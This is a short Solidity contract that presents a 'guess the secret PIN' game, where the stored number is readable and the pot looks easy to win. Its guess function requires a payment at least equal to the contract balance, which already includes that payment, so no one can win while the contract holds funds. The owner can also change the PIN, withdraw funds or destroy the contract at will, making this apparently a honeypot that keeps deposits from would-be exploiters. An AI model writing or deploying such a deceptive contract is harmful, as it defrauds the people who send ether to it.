1 pragma solidity ^0.5.2;
2 
3 contract PinRequired {
4     address payable public owner;
5     uint private topSecretNumber = 376001928;
6 
7     constructor() payable public {
8         owner = msg.sender;
9     }
10 
11 	function setPin(uint pin) public {
12 		require(msg.sender == owner);
13 		topSecretNumber = pin;
14 	}
15 
16     function withdraw() payable public {
17         require(msg.sender == owner);
18         owner.transfer(address(this).balance);
19     }
20     
21     function withdraw(uint256 amount) payable public {
22         require(msg.sender == owner);
23         owner.transfer(amount);
24     }
25 
26     function kill() public {
27         require(msg.sender == owner);
28         selfdestruct(msg.sender);
29     }
30 
31     function guess(uint g) public payable {
32         if(msg.value >= address(this).balance && g == topSecretNumber && msg.value >= 1 ether) {
33             msg.sender.transfer(address(this).balance + msg.value);
34         }
35     }
36     
37 	function() external payable {}
38 }